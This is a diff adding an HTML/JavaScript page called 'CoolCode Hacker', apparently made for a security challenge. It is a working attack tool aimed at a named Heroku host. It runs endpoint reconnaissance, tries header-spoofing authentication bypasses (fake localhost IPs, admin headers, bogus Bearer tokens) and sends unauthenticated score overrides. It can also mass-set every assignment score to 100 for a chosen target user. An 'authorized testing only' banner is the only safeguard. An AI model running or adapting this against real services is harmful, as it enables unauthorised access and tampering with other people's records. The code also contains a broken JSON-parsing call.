@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoolCode Hacker - Browser Tool</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            color: #00ff00;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            background: rgba(0, 255, 0, 0.05);
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .warning {
+            color: #ff6600;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        
+        .section {
+            margin: 20px 0;
+            padding: 20px;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        .section h2 {
+            color: #00ccff;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+        
+        .form-group {
+            margin: 10px 0;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #cccccc;
+        }
+        
+        input, textarea, button, select {
+            padding: 10px;
+            margin: 5px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #00ff00;
+            border-radius: 4px;
+            background: #000;
+            color: #00ff00;
+            width: 200px;
+        }
+        
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        button:hover {
+            background: #00cc00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        button:disabled {
+            background: #666;
+            color: #999;
+            cursor: not-allowed;
+        }
+        
+        .output {
+            background: #000;
+            padding: 15px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #333;
+            font-size: 12px;
+            line-height: 1.4;
+        }
+        
+        .status {
+            padding: 5px 10px;
+            border-radius: 3px;
+            margin: 5px;
+            display: inline-block;
+        }
+        
+        .status.success { background: #004400; color: #00ff00; }
+        .status.error { background: #440000; color: #ff4444; }
+        .status.warning { background: #443300; color: #ffaa00; }
+        .status.info { background: #000044; color: #4488ff; }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .progress {
+            width: 100%;
+            height: 20px;
+            background: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff00, #00ccff);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        .vulnerability {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        
+        .exploit-success {
+            background: rgba(0, 255, 0, 0.1);
+            border-left: 4px solid #00ff00;
+            padding: 10px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 CoolCode Hacker 🔥</h1>
+            <p>Cybersecurity Challenge Tool</p>
+            <p class="warning">⚠️ For Authorized Penetration Testing Only!</p>
+        </div>
+        
+        <div class="grid">
+            <div class="section">
+                <h2>🎯 Target Information</h2>
+                <div class="form-group">
+                    <label>Your Username:</label>
+                    <input type="text" id="username" value="CX8de3ce71-3cbTY" placeholder="Your username">
+                </div>
+                <div class="form-group">
+                    <label>Your Password:</label>
+                    <input type="password" id="password" placeholder="Your password">
+                </div>
+                <div class="form-group">
+                    <label>Target Username:</label>
+                    <input type="text" id="targetUsername" placeholder="Username to hack">
+                </div>
+                <button onclick="startReconnaissance()">🔍 Start Reconnaissance</button>
+            </div>
+            
+            <div class="section">
+                <h2>📊 Quick Actions</h2>
+                <button onclick="testScoreAPI()">🎯 Test Score API</button>
+                <button onclick="bruteForceAssignments()">💥 Brute Force All Assignments</button>
+                <button onclick="testAuthBypass()">🔓 Test Auth Bypass</button>
+                <button onclick="clearOutput()">🗑️ Clear Output</button>
+                
+                <div class="form-group" style="margin-top: 15px;">
+                    <label>Assignment ID:</label>
+                    <input type="number" id="assignmentId" value="1" min="1" max="50">
+                </div>
+                <div class="form-group">
+                    <label>Score:</label>
+                    <input type="number" id="score" value="100" min="0" max="100">
+                </div>
+                <button onclick="submitSingleScore()">📝 Submit Single Score</button>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>🚀 Automated Exploitation</h2>
+            <div style="display: flex; gap: 10px; align-items: center;">
+                <button onclick="runFullExploit()" id="exploitBtn">🚀 Run Full Exploit</button>
+                <button onclick="stopExploit()" id="stopBtn" disabled>⏹️ Stop</button>
+                <span id="exploitStatus"></span>
+            </div>
+            <div class="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>📋 Results & Output</h2>
+            <div id="vulnerabilities"></div>
+            <div id="output" class="output">Ready for hacking... 🕶️\n\nThis tool will help you complete the CoolCode challenge by:\n1. Reconnaissance of API endpoints\n2. Testing authentication mechanisms\n3. Exploiting score override vulnerabilities\n4. Verifying successful exploitation\n\nStart by clicking 'Start Reconnaissance' or 'Run Full Exploit'.\n</div>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = 'https://coolcode-hacker-34c5455cd908.herokuapp.com';
+        let exploitRunning = false;
+        let stopRequested = false;
+        
+        function log(message, type = 'info') {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toISOString().substr(11, 8);
+            const typeSymbols = {
+                'info': 'ℹ️',
+                'success': '✅',
+                'error': '❌', 
+                'warning': '⚠️',
+                'exploit': '🚀'
+            };
+            
+            const symbol = typeSymbols[type] || 'ℹ️';
+            output.textContent += `[${timestamp}] ${symbol} ${message}\n`;
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function updateProgress(percent) {
+            document.getElementById('progressBar').style.width = percent + '%';
+        }
+        
+        function addVulnerability(title, description, severity = 'high') {
+            const vulnDiv = document.getElementById('vulnerabilities');
+            const vulnElement = document.createElement('div');
+            vulnElement.className = severity === 'high' ? 'vulnerability' : 'exploit-success';
+            vulnElement.innerHTML = `<strong>${title}</strong><br>${description}`;
+            vulnDiv.appendChild(vulnElement);
+        }
+        
+        function clearOutput() {
+            document.getElementById('output').textContent = '';
+            document.getElementById('vulnerabilities').innerHTML = '';
+            updateProgress(0);
+        }
+        
+        async function makeRequest(method, endpoint, data = null, customHeaders = {}) {
+            const url = BASE_URL + endpoint;
+            
+            const headers = {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json',
+                'User-Agent': 'CoolCodeHacker/1.0',
+                ...customHeaders
+            };
+            
+            const options = {
+                method: method,
+                headers: headers,
+                mode: 'cors'
+            };
+            
+            if (data) {
+                options.body = JSON.stringify(data);
+            }
+            
+            try {
+                const response = await fetch(url, options);
+                const responseText = await response.text();
+                
+                log(`${method} ${endpoint} -> ${response.status}`, 
+                    response.ok ? 'success' : 'error');
+                
+                if (responseText) {
+                    log(`Response: ${responseText.substring(0, 200)}${responseText.length > 200 ? '...' : ''}`, 'info');
+                }
+                
+                return {
+                    status: response.status,
+                    ok: response.ok,
+                    text: responseText,
+                    json: responseText ? JSON.parse(responseText).catch(() => null) : null
+                };
+                
+            } catch (error) {
+                log(`Request failed: ${error.message}`, 'error');
+                return { error: error.message };
+            }
+        }
+        
+        async function startReconnaissance() {
+            log('🔍 Starting reconnaissance phase...', 'info');
+            
+            const endpoints = [
+                '/',
+                '/api/',
+                '/api/health',
+                '/api/users', 
+                '/api/assignments',
+                '/api/scores',
+                '/api/auth/login',
+                '/api/login',
+                '/api/api/assignment/score'
+            ];
+            
+            let accessibleCount = 0;
+            
+            for (const endpoint of endpoints) {
+                if (stopRequested) break;
+                
+                const response = await makeRequest('GET', endpoint);
+                if (response && response.status < 500) {
+                    accessibleCount++;
+                    if (response.status === 200) {
+                        addVulnerability(
+                            `Accessible Endpoint: ${endpoint}`,
+                            `Status: ${response.status} - Endpoint is publicly accessible`,
+                            'low'
+                        );
+                    }
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            
+            log(`Reconnaissance complete. Found ${accessibleCount} accessible endpoints.`, 'success');
+        }
+        
+        async function testScoreAPI() {
+            log('🎯 Testing score API vulnerabilities...', 'exploit');
+            
+            const testPayload = {
+                "username": "test_user",
+                "assignmentId": 1,
+                "score": 100
+            };
+            
+            // Test direct access
+            let response = await makeRequest('POST', '/api/api/assignment/score', testPayload);
+            
+            if (response && response.status === 200) {
+                addVulnerability(
+                    'CRITICAL: Unauthenticated Score Override',
+                    'The score API allows unauthenticated score modifications!',
+                    'high'
+                );
+                log('🚨 VULNERABILITY FOUND: Score API is accessible without authentication!', 'exploit');
+                return true;
+            }
+            
+            // Test with bypass headers
+            const bypassHeaders = [
+                { 'X-Forwarded-For': '127.0.0.1' },
+                { 'X-Real-IP': '127.0.0.1' },
+                { 'X-Admin': 'true' },
+                { 'Authorization': 'Bearer fake_token' },
+                { 'Origin': BASE_URL, 'Referer': BASE_URL + '/ui/' }
+            ];
+            
+            for (const headers of bypassHeaders) {
+                response = await makeRequest('POST', '/api/api/assignment/score', testPayload, headers);
+                
+                if (response && response.status === 200) {
+                    addVulnerability(
+                        'CRITICAL: Header-based Auth Bypass',
+                        `Score API can be bypassed using headers: ${JSON.stringify(headers)}`,
+                        'high'
+                    );
+                    log(`🚨 BYPASS FOUND with headers: ${JSON.stringify(headers)}`, 'exploit');
+                    return true;
+                }
+                
+                await new Promise(resolve => setTimeout(resolve, 50));
+            }
+            
+            log('❌ No obvious vulnerabilities found in score API', 'warning');
+            return false;
+        }
+        
+        async function submitSingleScore() {
+            const username = document.getElementById('targetUsername').value;
+            const assignmentId = parseInt(document.getElementById('assignmentId').value);
+            const score = parseInt(document.getElementById('score').value);
+            
+            if (!username) {
+                log('Please enter a target username', 'error');
+                return;
+            }
+            
+            log(`Attempting to set score for ${username}, Assignment ${assignmentId}, Score ${score}`, 'info');
+            
+            const payload = {
+                "username": username,
+                "assignmentId": assignmentId,
+                "score": score
+            };
+            
+            const response = await makeRequest('POST', '/api/api/assignment/score', payload);
+            
+            if (response && response.status === 200) {
+                log(`✅ Score successfully set!`, 'success');
+                addVulnerability(
+                    'Successful Score Override',
+                    `Assignment ${assignmentId} score set to ${score} for user ${username}`,
+                    'low'
+                );
+            } else {
+                log(`❌ Score submission failed`, 'error');
+            }
+        }
+        
+        async function bruteForceAssignments() {
+            const username = document.getElementById('targetUsername').value;
+            
+            if (!username) {
+                log('Please enter a target username', 'error');
+                return;
+            }
+            
+            log(`🔥 Starting brute force attack on all assignments for ${username}...`, 'exploit');
+            
+            let successCount = 0;
+            const totalAssignments = 20;
+            
+            for (let i = 1; i <= totalAssignments; i++) {
+                if (stopRequested) break;
+                
+                const payload = {
+                    "username": username,
+                    "assignmentId": i,
+                    "score": 100
+                };
+                
+                const response = await makeRequest('POST', '/api/api/assignment/score', payload);
+                
+                if (response && response.status === 200) {
+                    successCount++;
+                    log(`✅ Assignment ${i}: SUCCESS`, 'success');
+                } else {
+                    log(`❌ Assignment ${i}: FAILED`, 'error');
+                }
+                
+                updateProgress((i / totalAssignments) * 100);
+                await new Promise(resolve => setTimeout(resolve, 100));
+            }
+            
+            log(`🎯 Brute force complete! Successfully modified ${successCount}/${totalAssignments} assignments`, 'success');
+            
+            if (successCount > 0) {
+                addVulnerability(
+                    'Successful Mass Score Override',
+                    `Successfully overrode ${successCount} assignment scores to 100 for user ${username}`,
+                    'high'
+                );
+            }
+        }
+        
+        async function testAuthBypass() {
+            log('🔓 Testing authentication bypass methods...', 'exploit');
+            
+            const testEndpoints = [
+                '/api/users',
+                '/api/assignments',
+                '/api/admin',
+                '/admin'
+            ];
+            
+            const bypassMethods = [
+                { name: 'Direct Access', headers: {} },
+                { name: 'Local IP Spoof', headers: { 'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1' } },
+                { name: 'Admin Headers', headers: { 'X-Admin': 'true', 'X-Role': 'admin' } },
+                { name: 'Fake Token', headers: { 'Authorization': 'Bearer admin_token' } },
+                { name: 'Origin Bypass', headers: { 'Origin': BASE_URL, 'Referer': BASE_URL + '/admin/' } }
+            ];
+            
+            for (const endpoint of testEndpoints) {
+                for (const method of bypassMethods) {
+                    const response = await makeRequest('GET', endpoint, null, method.headers);
+                    
+                    if (response && response.status === 200) {
+                        addVulnerability(
+                            `Auth Bypass: ${method.name}`,
+                            `Endpoint ${endpoint} accessible via ${method.name}`,
+                            'high'
+                        );
+                        log(`🚨 BYPASS: ${endpoint} accessible via ${method.name}`, 'exploit');
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 50));
+                }
+            }
+            
+            log('Authentication bypass testing complete', 'info');
+        }
+        
+        async function runFullExploit() {
+            if (exploitRunning) return;
+            
+            exploitRunning = true;
+            stopRequested = false;
+            document.getElementById('exploitBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            document.getElementById('exploitStatus').textContent = 'Running...';
+            
+            clearOutput();
+            log('🚀 Starting full exploitation sequence...', 'exploit');
+            
+            try {
+                // Phase 1: Reconnaissance
+                log('Phase 1: Reconnaissance', 'info');
+                updateProgress(10);
+                await startReconnaissance();
+                
+                if (stopRequested) return;
+                
+                // Phase 2: Test Score API
+                log('Phase 2: Testing Score API', 'info');
+                updateProgress(30);
+                const apiVulnerable = await testScoreAPI();
+                
+                if (stopRequested) return;
+                
+                // Phase 3: Test Auth Bypass
+                log('Phase 3: Testing Authentication Bypass', 'info');
+                updateProgress(50);
+                await testAuthBypass();
+                
+                if (stopRequested) return;
+                
+                // Phase 4: Mass Exploitation
+                if (apiVulnerable) {
+                    log('Phase 4: Mass Score Override', 'exploit');
+                    updateProgress(70);
+                    await bruteForceAssignments();
+                }
+                
+                updateProgress(100);
+                log('🎉 Full exploitation sequence complete!', 'success');
+                document.getElementById('exploitStatus').textContent = 'Complete!';
+                
+            } catch (error) {
+                log(`Exploit failed: ${error.message}`, 'error');
+                document.getElementById('exploitStatus').textContent = 'Failed!';
+            } finally {
+                exploitRunning = false;
+                document.getElementById('exploitBtn').disabled = false;
+                document.getElementById('stopBtn').disabled = true;
+            }
+        }
+        
+        function stopExploit() {
+            stopRequested = true;
+            log('🛑 Stopping exploitation...', 'warning');
+            document.getElementById('exploitStatus').textContent = 'Stopping...';
+        }
+        
+        // Initialize
+        log('CoolCode Hacker initialized. Ready for ethical hacking! 🕶️', 'info');
+        log('Target: https://coolcode-hacker-34c5455cd908.herokuapp.com', 'info');
+        log('API Endpoint: /api/api/assignment/score', 'info');
+    </script>
+</body>
+</html>
